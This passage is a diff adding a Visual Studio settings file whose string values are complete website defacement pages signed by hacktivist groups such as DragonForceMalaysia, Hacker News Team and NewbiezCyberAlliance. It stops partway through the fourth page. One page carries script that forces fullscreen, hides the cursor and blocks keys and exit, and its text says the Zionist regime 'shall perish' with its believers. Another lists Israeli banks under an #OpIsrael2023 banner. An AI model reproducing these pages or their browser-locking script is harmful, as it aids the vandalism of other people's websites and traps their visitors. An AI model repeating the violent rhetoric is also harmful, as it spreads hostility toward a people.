@@ -1,0 +1,2987 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="My" GeneratedClassName="MySettings" UseMySettingsClassName="true">
+  <Profiles />
+  <Settings>
+    <Setting Name="Index1" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;html lang="en-US"&gt;
+   &lt;head&gt;
+     &lt;title&gt;owned By ISMAIL MAN54&lt;/title&gt; 
+     &lt;meta name="description" content="Illusion Silent Killer"&gt;
+     &lt;meta name="theme-color" content="black"&gt;
+     &lt;link rel="icon" href="https://i.ibb.co/6mmXS4R/20201108-055331.jpg"&gt;
+     &lt;link href="https://fonts.googleapis.com/css?family=Rancho&amp;effect=shadow-multiple|neon" rel="stylesheet"&gt;
+     &lt;style&gt;
+     html{
+       font-family: "Lucida Console", "Courier New", monospace;
+       color: white;
+       text-shadow:3px 1.5px 3px red;
+     }
+     body{
+     overflow-y: hidden ! important;
+     overflow-y: hidden ! important;
+     background-color: #000;
+
+	background-image: linear-gradient(rgba(0, 0, 0, 0.60), rgba(0, 0, 0, 0.60)),url(http://m.gettywallpapers.com/wp-content/uploads/2022/06/Dark-PC-Wallpaper.jpg);
+     background-size: 100% 100%;
+     backgroud-attachment: scroll;
+     background-position: 0% 0%;
+     background-repeat: no-repeat;
+     }
+       button{
+         background: black;
+		 filter: brightness(40%);
+         color:white;
+         text-shadow: 0px 0px 10px red;
+         border-radius:6px;
+         border: 1.4px solid #d40000;
+         box-shadow: 0px 0px 5px red;
+         font-family:Jura;
+         padding:5px;
+       }
+     &lt;/style&gt;
+     &lt;body bgcolor="black"&gt;&lt;center&gt;
+       &lt;table height="65%" width="50%"&gt;&lt;td align="center"&gt;
+         &lt;img class="circle" height="400" src="https://www.freepnglogos.com/uploads/gas-mask-png/gas-mask-drawing-virus-vector-graphics-download-images-14.png"&gt;
+       &lt;h1&gt;OWNED By  ISMAIL MAN54&lt;/h1&gt;
+       &lt;h2&gt;&amp;quot;ALGERIAN HACKER.&amp;quot;&lt;/h2&gt;
+     &lt;h3&gt;&lt;/h3&gt;
+       &lt;div class="animasi" align="bottom"&gt; 
+       &lt;/div&gt;
+       &lt;button type="button" class="btn" onclick="play()"&gt;Play &lt;b&gt;Music&lt;/button&gt;&lt;button type="button" class="btn" onclick="pause()"&gt;Pause &lt;b&gt;Music&lt;/button&gt;&lt;br&gt;&lt;br&gt;
+       &lt;div id="clock"&gt;&lt;/div&gt;
+       &lt;script type="text/javascript"&gt;
+       function showTime() {
+         var a_p = "";
+         var today = new Date();
+         var curr_hour = today.getHours();
+         var curr_minute = today.getMinutes();
+         var curr_second = today.getSeconds();
+         if (curr_hour &lt; 12) {
+           a_p = "AM";
+         } 
+         else 
+         {
+           a_p = "PM";
+           
+         }
+         if (curr_hour == 0) {
+           curr_hour = 12;
+         }
+         if (curr_hour &gt; 12) {
+           curr_hour = curr_hour - 12;
+         }
+         curr_hour = checkTime(curr_hour);
+         curr_minute = checkTime(curr_minute);
+         curr_second = checkTime(curr_second);
+         document.getElementById('clock').innerHTML=curr_hour + ":" + curr_minute + ":" + curr_second + " " + a_p;
+       }
+       function checkTime(i) {
+         if (i &lt; 10) {
+           i = "0" + i;
+         }
+         return i;
+       }
+       setInterval(showTime, 500);
+       &lt;/script&gt;
+       &lt;script type="text/javascript"&gt;
+       var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+       var myDays = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday&amp;#39;at', 'Saturday'];
+       var date = new Date();
+       var day = date.getDate();
+       var month = date.getMonth();
+       var thisDay = date.getDay(),
+       thisDay = myDays[thisDay];
+       var yy = date.getYear();
+       var year = (yy &lt; 1000) ? yy + 1900 : yy;
+       document.write(thisDay + ', ' + day + ' ' + months[month] + ' ' + year);
+       &lt;/script&gt;
+       &lt;/div&gt;&lt;br&gt;
+       &lt;script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"&gt;&lt;/script&gt;
+       &lt;script&gt;
+       function play() {
+         var audio = document.getElementById("lagu");
+         audio.play();
+       }
+       function pause() {
+         var audio = document.getElementById("lagu");
+         audio.pause();
+       }
+       &lt;/script&gt;
+       &lt;audio id="lagu" src="https://server13.mp3quran.net/husr/008.mp3"&gt;&lt;/audio&gt;
+       &lt;br&gt;&amp;#12300; &lt;marquee height='23' width='40%' behavior='alternate' scrollamount='10'&gt; The Religion of islam .. are bigger than you&lt;/marquee&gt; &amp;#12301;&lt;br&gt;&amp;copy2023 | MAN54&lt;/h2&gt;
+       &lt;html&gt;</Value>
+    </Setting>
+    <Setting Name="Index2" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;META http-equiv=content-type content=text/html;charset=iso-8859-9&gt;
+&lt;META http-equiv=content-type content=text/html;charset=windows-1254&gt;
+&lt;META http-equiv=content-type content=text/html;charset=x-mac-turkish&gt;
+
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
+&lt;meta name="keywords" content="DragonForceMalaysia"&gt;
+&lt;meta name="description" content="DragonForceMalaysia"&gt;&lt;script type="text/javascript"&gt;
+
+&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+&lt;/script&gt;
+    &lt;link rel="stylesheet" href="https://bit.ly/2UGCIC5"&gt;
+  &lt;/head&gt;
+&lt;title&gt;Hacked by DragonForceMalaysia&lt;/title&gt;
+
+&lt;body style="background-image: url('http://i.imgur.com/zHNCk2e.gif'); background-repeat: repeat; background-position: center; background-attachment: fixed; oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body"&gt;
+    
+    &lt;script language="JavaScript"&gt;
+      window.onbeforeunload = confirmExit;
+
+      function confirmExit() {
+        return "are you sure ? wkwk";
+      }
+
+      function fs() {
+        var elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+          elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        }
+        document.getElementById("body").style.cursor = 'none';
+        document.onkeydown = function(e) {
+          return false;
+        }
+        document.addEventListener("keydown", e =&gt; {
+          if (e.key == "F11") e.preventDefault();
+        });
+      }
+    &lt;/script&gt;
+&lt;script id="rendered-js"&gt;
+
+&lt;style&gt;
+
+@import url("https://fonts.googleapis.com/css?family=Paytone+One");
+body, html {
+  background: #060a19;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  font-family: Paytone One;
+}
+
+p {
+  color: #fff;
+  background: #000;
+  mix-blend-mode: lighten;
+  font-size: 30px;
+  text-align: center;
+  position: absolute;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  margin: auto;
+  height: 100px;
+  -moz-animation: filterHue2 2s linear infinite;
+  -webkit-animation: filterHue2 2s linear infinite;
+  animation: filterHue2 2s linear infinite;
+}
+p::before {
+  content: '';
+  display: block;
+  position: absolute;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  background: #e23b4a;
+  background: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4gPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiBncmFkaWVudFVuaXRzPSJvYmplY3RCb3VuZGluZ0JveCIgeDE9IjAuMCIgeTE9IjAuNSIgeDI9IjEuMCIgeTI9IjAuNSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzIzOTY2YyIvPjxzdG9wIG9mZnNldD0iMjUlIiBzdG9wLWNvbG9yPSIjZmFhYTU0Ii8+PHN0b3Agb2Zmc2V0PSI1MCUiIHN0b3AtY29sb3I9IiNlMjNiNGEiLz48c3RvcCBvZmZzZXQ9Ijc1JSIgc3RvcC1jb2xvcj0iI2RiMDc2OCIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iIzM2MDY3MCIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjZ3JhZCkiIC8+PC9zdmc+IA==');
+  background: -webkit-gradient(linear, 0% 50%, 100% 50%, color-stop(0%, #23966c), color-stop(25%, #faaa54), color-stop(50%, #e23b4a), color-stop(75%, #db0768), color-stop(100%, #360670));
+  background: -moz-linear-gradient(left, #23966c, #faaa54, #e23b4a, #db0768, #360670);
+  background: -webkit-linear-gradient(left, #23966c, #faaa54, #e23b4a, #db0768, #360670);
+  background: linear-gradient(to right, #23966c, #faaa54, #e23b4a, #db0768, #360670);
+  pointer-events: none;
+  mix-blend-mode: multiply;
+}
+
+.loader-container {
+  width: 100px;
+  height: 100px;
+  position: absolute;
+  -moz-animation: scaleUp 0.5s linear;
+  -webkit-animation: scaleUp 0.5s linear;
+  animation: scaleUp 0.5s linear;
+  -moz-transform: scale(0);
+  -ms-transform: scale(0);
+  -webkit-transform: scale(0);
+  transform: scale(0);
+  opacity: 0;
+}
+.loader-container .loader {
+  background: #ff0c0c;
+  background: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4gPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiBncmFkaWVudFVuaXRzPSJvYmplY3RCb3VuZGluZ0JveCIgeDE9Ii0wLjAzOTYxNCIgeTE9IjAuOTUyNzkiIHgyPSIxLjAzOTYxNCIgeTI9IjAuMDQ3MjEiPjxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmZjBjMGMiLz48c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMyMWQ0MDAiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyYWQpIiAvPjwvc3ZnPiA=');
+  background: -moz-linear-gradient(40deg, #ff0c0c, #21d400);
+  background: -webkit-linear-gradient(40deg, #ff0c0c, #21d400);
+  background: linear-gradient(50deg, #ff0c0c, #21d400);
+  border-radius: 10px;
+  -webkit-filter: hue-rotate(0deg);
+  filter: hue-rotate(0deg);
+  animation: filterHue 2.5s linear infinite;
+  height: 100%;
+  width: 100%;
+  transform: rotate(0deg);
+}
+.loader-container .loader::after {
+  content: '';
+  position: absolute;
+  height: 80px;
+  width: 80px;
+  left: 10px;
+  top: 10px;
+  border-radius: 100%;
+}
+
+@-webkit-keyframes $animationName {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+  }
+}
+@-moz-keyframes filterHue2 {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+  }
+}
+@-ms-keyframes filterHue2 {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+  }
+}
+@keyframes filterHue2 {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+  }
+}
+@-webkit-keyframes $animationName {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-moz-keyframes filterHue {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-ms-keyframes filterHue {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes filterHue {
+  50% {
+    -webkit-filter: hue-rotate(1000deg);
+    filter: hue-rotate(1000deg);
+  }
+  100% {
+    -webkit-filter: hue-rotate(2000deg);
+    filter: hue-rotate(2000deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-webkit-keyframes $animationName {
+  50% {
+    -moz-transform: scale(0.5);
+    -ms-transform: scale(0.5);
+    -webkit-transform: scale(0.5);
+    transform: scale(0.5);
+    opacity: 1;
+  }
+  100% {
+    -moz-transform: scale(0.25);
+    -ms-transform: scale(0.25);
+    -webkit-transform: scale(0.25);
+    transform: scale(0.25);
+  }
+}
+@-moz-keyframes scaleUp {
+  50% {
+    -moz-transform: scale(0.5);
+    -ms-transform: scale(0.5);
+    -webkit-transform: scale(0.5);
+    transform: scale(0.5);
+    opacity: 1;
+  }
+  100% {
+    -moz-transform: scale(0.25);
+    -ms-transform: scale(0.25);
+    -webkit-transform: scale(0.25);
+    transform: scale(0.25);
+  }
+}
+@-ms-keyframes scaleUp {
+  50% {
+    -moz-transform: scale(0.5);
+    -ms-transform: scale(0.5);
+    -webkit-transform: scale(0.5);
+    transform: scale(0.5);
+    opacity: 1;
+  }
+  100% {
+    -moz-transform: scale(0.25);
+    -ms-transform: scale(0.25);
+    -webkit-transform: scale(0.25);
+    transform: scale(0.25);
+  }
+}
+@keyframes scaleUp {
+  50% {
+    -moz-transform: scale(0.5);
+    -ms-transform: scale(0.5);
+    -webkit-transform: scale(0.5);
+    transform: scale(0.5);
+    opacity: 1;
+  }
+  100% {
+    -moz-transform: scale(0.25);
+    -ms-transform: scale(0.25);
+    -webkit-transform: scale(0.25);
+    transform: scale(0.25);
+  }
+}
+@supports (-ms-ime-align: auto) {
+  p {
+    color: #21d400;
+    background: transparent;
+    mix-blend-mode: lighten;
+    font-size: 30px;
+    text-align: center;
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    bottom: 0;
+    margin: auto;
+    height: 100px;
+    -moz-animation: filterHue2 2s linear infinite;
+    -webkit-animation: filterHue2 2s linear infinite;
+    animation: filterHue2 2s linear infinite;
+  }
+
+  p::before {
+    content: '';
+    display: block;
+    position: absolute;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    background: transparent;
+  }
+}
+@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+  p {
+    color: #ff447c;
+    background: transparent;
+    mix-blend-mode: lighten;
+    font-size: 30px;
+    text-align: center;
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    bottom: 0;
+    margin: auto;
+    height: 100px;
+    -moz-animation: filterHue2 2s linear infinite;
+    -webkit-animation: filterHue2 2s linear infinite;
+    animation: filterHue2 2s linear infinite;
+  }
+
+  p::before {
+    content: '';
+    display: block;
+    position: absolute;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    background: transparent;
+  }
+
+  .loader {
+    background: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4gPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiBncmFkaWVudFVuaXRzPSJvYmplY3RCb3VuZGluZ0JveCIgeDE9Ii0wLjAzOTYxNCIgeTE9IjAuOTUyNzkiIHgyPSIxLjAzOTYxNCIgeTI9IjAuMDQ3MjEiPjxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmMDAwNTAiLz48c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMyMzgwZmYiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyYWQpIiAvPjwvc3ZnPiA=') !important;
+    background: -moz-linear-gradient(40deg, #f00050, #2380ff) !important;
+    background: -webkit-linear-gradient(40deg, #f00050, #2380ff) !important;
+    background: linear-gradient(50deg, #f00050, #2380ff) !important;
+  }
+}
+&lt;/style&gt;
+
+  &lt;script src="../codepen.io/assets/common/stopExecutionOnTimeout-8216c69d01441f36c0ea791ae2d4469f0f8ff5326f00ae2d00e4bb7d20e24edb.js"&gt;&lt;/script&gt;
+
+  
+      &lt;script id="rendered-js" &gt;
+window.addEventListener("mousemove", function (e) {
+  var to_append = document.getElementsByClassName('loader-container')[0];
+  var all = document.getElementsByClassName('loader-container');
+
+  var parent_div = document.createElement('div');
+  parent_div.className = "loader-container";
+  var inner_div = document.createElement('div');
+  inner_div.className = "loader";
+  parent_div.appendChild(inner_div);
+  var d = document.body.appendChild(parent_div);
+
+  parent_div.style.left = e.clientX - 50 + 'px';
+  parent_div.style.top = e.clientY - 50 + 'px';
+
+  if (document.getElementsByClassName('loader-container').length &gt; 50) {
+    document.body.removeChild(to_append);
+  }
+});
+//# sourceURL=pen.js
+    &lt;/script&gt;
+
+&lt;/head&gt;
+
+&lt;div align="center"&gt;&lt;/div&gt;
+
+
+&lt;/head&gt;
+&lt;body bgcolor=black&gt;
+&lt;center&gt;
+&lt;font size='6' face='One'style="color: green; text-shadow: 0px 1px 7px red";&gt;#OpsPetir&lt;/font&gt;&lt;br&gt;
+
+&lt;center&gt;&lt;img src="https://i.imgur.com/l04DZJV.png" width="20%"&gt;&lt;/center&gt;
+
+
+&lt;font color="#00FF00"&gt;
+
+
+
+&lt;CENTER&gt;&lt;B&gt;  &lt;strong&gt;&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;Greetings The Government of Israel. We Are DragonForceMalaysia&lt;/font&gt;&lt;br&gt;
+
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;TO ALL MUSLIMS AND HUMANITY AROUND THE WORLD.&lt;/p&gt;
+&lt;p&gt;IT IS INHUMANE OF US TO JUST SIT STILL AND DO NOTHING.
+&lt;red&gt;AGGRESSION, OPPRESSION, OCCUPATION&lt;/red&gt; STILL HAPPENS.
+APARTHEID IS A CRIME AGAINST HUMANITY AND WE SHALL JOIN FORCES.
+BE IT &lt;strong&gt;INDIVIDUAL, CELEBRITIES, PUBLIC FIGURES, ANY MEDIA POWER HOUSE, POLITICAL FIGURES&lt;/strong&gt; WHOM STAND THEIR GROUND TO PROTECT WHATâ€™S LEFT FROM THE EVIL DOING.
+A BRUTAL REGIME, &lt;strong&gt;&lt;red&gt;ZIONIST&lt;/red&gt;&lt;/strong&gt; SHALL PERISH ALONG WITH GHARQAD AND ITS BELIEVERS.
+PROVOCATION SHOULD BE STOPPED AT ALL COSTS.
+&lt;red&gt;BLOOD&lt;/red&gt; IS IN YOUR HANDS, IF YOU WERE SIT STILL AND DO NOTHING.
+&lt;/font&gt;&lt;br&gt;
+
+
+
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;WE CAME, WE SAW AND WE SHARE.&lt;/font&gt;&lt;br&gt;
+
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;TECHNOLOGIES OF THE MODERN WORLD SHOULD BE USED FOR THE GOOD CAUSE.&lt;/font&gt;&lt;br&gt;
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;RESISTANCE IS FUTILE.&lt;/font&gt;&lt;br&gt;
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;EXPECT THE STORM AND THUNDER!!
+FROM THE RIVER TO THE SEA, PALESTINE WILL BE FREE.&lt;/font&gt;&lt;br&gt;
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;&gt;WORLD SHOULD UNITE IN THE NAME OF HUMANITY. ALLAH IS THE ALMIGHTY!! MAY YOU BE REWARDED WITH GOOD DEEDS IN THIS WORLD AND THE HEREAFTER. AMEEN.&lt;/font&gt;&lt;br&gt;
+
+&lt;font size='4' face=' One'style="color: green; text-shadow: 0px 1px 7px red";&gt;#OPSPETIR ENGAGED, Expect us
+#DragonForceMalaysia&lt;/font&gt;&lt;br&gt;
+
+
+&lt;video autoplay loop allowscriptaccess='always' allowfullscreen='false' width='1' height='0' &gt;
+
+    
+	&lt;audio src="http://audio.teamtil.net/quran/mishaari-bin-rashid_al-%60afasy/002%20--%20Surat%20al-Baqarah.mp3" autoplay="true" id="lagu" loop=""&gt;&lt;/audio&gt;
+&lt;/script&gt;
+
+&lt;/head&gt;
+
+&lt;/body&gt;
+&lt;/div&gt;
+&lt;/HTML&gt;</Value>
+    </Setting>
+    <Setting Name="Index3" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;HACKED by Hacker News Team&lt;/title&gt;
+&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;style&gt;
+
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@1000&amp;display=swap');
+
+body, html {
+  height: 100%;
+  margin: 0;
+  background-color: black;
+}
+
+.bg {
+
+
+  background-color: black;
+  height: 100%; 
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class="bg"&gt;
+&lt;center&gt;
+&lt;img src="https://yt3.googleusercontent.com/BkDjV-6nGZrEOL2UB9AbRdqEQcDVnDQjWw-iyHr52eYiJPeQdGY3Tywj19oJw5FGzdCDvgoV7XU=s176-c-k-c0x00ffffff-no-rj" width="200px"&gt;&lt;br&gt;
+&lt;a href="https://www.facebook.com/HackerNewsAR"&gt;&lt;img src="https://www.facebook.com/photo/?fbid=493978669402267&amp;set=a.493978622735605" alt srcset width="50px"&gt;&lt;/a&gt;
+&lt;br&gt;
+&lt;p style="font-size: 20px;font-family: 'Cairo', sans-serif;"&gt;
+&lt;span style="color:red"&gt;بنك هبوعليم 
+- بنك لئومي 
+- بنك مزراحي تفحوت 
+- بنك إسرائيل البريدي 
+- Israel Credit Cards Ltd
+- BANK HADOAR بنك البريد
+- Max IT Finance
+- Europay (Eurocard) Israel Ltd
+- PAYONEER ISSUED BY ISRAEL POSTAL BANK CO&lt;/span&gt;
+&lt;/p&gt;
+&lt;video width="1000" height="600" controls style="box-shadow: 0px 1px 20px 3px red;"&gt;
+&lt;source src="https://www.youtube.com/v/69PiJsso0e4&amp;feature=related&amp;autoplay=1&amp;loop=1"&gt;
+&lt;/video&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;p style="font-size: 20px;font-family: 'Cairo', sans-serif;"&gt;
+
+&lt;p style="font-size: 20px;font-family: 'Cairo', sans-serif;"&gt;
+&lt;p style="font-size: 20px;font-family: 'Cairo', sans-serif;"&gt;
+&lt;span style="color:red"&gt;#OpIsrael2023
+#HackerNews&lt;/span&gt;
+&lt;br&gt;
+&lt;/p&gt;
+&lt;/p&gt;
+&lt;/center&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</Value>
+    </Setting>
+    <Setting Name="Index4" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;html&gt;&lt;head&gt;
+  &lt;title&gt;hacked??? -.-&lt;/title&gt;
+  &lt;link rel="SHORTCUT ICON" href="https://dc699.4shared.com/img/7feysZ6Vge/s23/1878f98ea00/NCA" type="image/jpg"&gt;
+  &lt;meta name="robots" content="index, follow"&gt;
+  &lt;meta name="Description" content="Hacked ? Ow sorry, your website has pwned vulnerable"&gt;
+  &lt;meta name="keyword" content="Newbiez Cyber Alliance - Since 2023"&gt;
+  &lt;meta name="googlebot" content="index,follow"&gt;
+  &lt;meta name="robots" content="all"&gt;
+  &lt;meta name="robots schedule" content="auto"&gt;
+  &lt;meta name="distribution" content="global"&gt;
+  &lt;meta property="og:title" content="HACKED BY - NCA"&gt;
+  &lt;meta property="og:image" content="https://dc699.4shared.com/img/7feysZ6Vge/s23/1878f98ea00/NCA"&gt;
+  &lt;audio src="https://audio.jukehost.co.uk/0BHfzAuFH2YjGJgowsqrrwwszCbXIvqT" autoplay="true" id="lagu" loop=""&gt;&lt;/audio&gt;
+  &lt;link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css"&gt;
+  &lt;link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet" type="text/css"&gt;
+  &lt;link href="https://fonts.googleapis.com/css?family=Abel:200,100,400" rel="stylesheet" type="text/css"&gt;
+  &lt;style type="text/css"&gt;
+ td {font-family: Bradley Hand ITC; font-size: 18pt; color: black; text-align: center;}
+a {font-family: Bradley Hand ITC; font-size: 12pt; color: red; text-align: center;}
+&lt;/style&gt;
+&lt;center&gt;
+  &lt;div id="fade"&gt;&lt;img src="https://dc699.4shared.com/img/7feysZ6Vge/s23/1878f98ea00/NCA" width="20%" alt="back_logo"&gt;&lt;/div&gt;
+&lt;/center&gt;
+&lt;center&gt;
+  &lt;marquee title="NCA" behavior="scroll" direction="right" scrollamount="100" scrolldelay="80" width="100%"&gt;&lt;font color="red"&gt;____________________________________________________________________________ ___ _&lt;/font&gt;&lt;/marquee&gt;
+  &lt;div id="example1"&gt;
+    &lt;p id="example2"&gt;&lt;font size="10" face="Iceland" color="#FFFFFF"&gt;Hacked by :&lt;/font&gt; &lt;font size="7" width="50" face="iceland" onclick="https://www.facebook.com/NewbiezCyberAlliance" color="#FF0000"&gt;NewbiezCyberAlliance&lt;/font&gt; &lt;marquee title="NCA" behavior="scroll" direction="left" scrollamount="100" scrolldelay="80" width="100%"&gt;&lt;font color="red"&gt;_ ___ ____________________________________________________________________________&lt;/font&gt;&lt;/marquee&gt;&lt;/p&gt;
+    &lt;hr size="6" width="50%" color="#424242" align="center"&gt;
+    &lt;font size="6" color="white"&gt;Greetings administrator/s&lt;br&gt;
+    We're just here to inform you that we have just Found a Vulnerability on your security.&lt;br&gt;
+    Please try to Improve your Website Security for any threat of Cyber Attack.&lt;br&gt;
+    We're not the only Hacker in the world. Please Patch your system.&lt;br&gt;
+    If your website is always vulnerable and you don't have any&lt;br&gt;
+    idea how to resolve this breach, hire a cyber security team.&lt;br&gt;
+    &lt;br&gt;
+    "NO FILES/RECORDS WERE DELETED DURING THE HACKING PROCESS."&lt;/font&gt; &lt;b&gt;&lt;br&gt;
+    &lt;br&gt;&lt;/b&gt;
+    &lt;center&gt;
+      &lt;b&gt;&lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="crimson" size="5"&gt;DNH@KLAMMER&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt;&lt;br&gt;
+      &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@Thespian&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@Orion&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@xGuardian&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt;&lt;br&gt;
+      &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@Feithan&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@H1TB0X&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@Chaos&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@Lucifer&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;DNH@Mh1k&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt;&lt;br&gt;
